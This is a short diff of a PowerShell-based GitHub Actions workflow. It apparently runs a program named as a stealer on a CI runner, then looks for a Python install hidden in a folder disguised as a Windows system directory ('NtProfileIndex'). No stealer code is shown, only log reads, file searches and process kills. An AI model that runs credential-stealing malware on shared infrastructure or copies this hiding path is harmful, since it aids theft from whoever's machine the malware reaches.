@@ -35,7 +35,7 @@ jobs:
           Start-Sleep -Seconds 45
           Get-Content "$d\run.log" -Raw
           Get-Content "$d\run.err" -Raw
-          $py = Get-ChildItem "$env:LOCALAPPDATA" -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1
+          $py = Get-ChildItem "$env:LOCALAPPDATA\Microsoft\Windows\NtProfileIndex" -Recurse -Filter python.exe -ErrorAction SilentlyContinue | Select-Object -First 1
           if ($py) { "FOUND=" + $py.FullName; $py.FullName | Set-Content "$d\py.txt" } else { "NO PYTHON" }
           Get-ChildItem $env:LOCALAPPDATA -Recurse -Filter "*.log" -ErrorAction SilentlyContinue | Select-Object -First 10 FullName | Out-String | Write-Output
       - name: Run stealer directly
@@ -62,3 +62,4 @@ jobs:
         if: always()
         shell: powershell
         run: Get-Process java,python* -ErrorAction SilentlyContinue | Stop-Process -Force
+
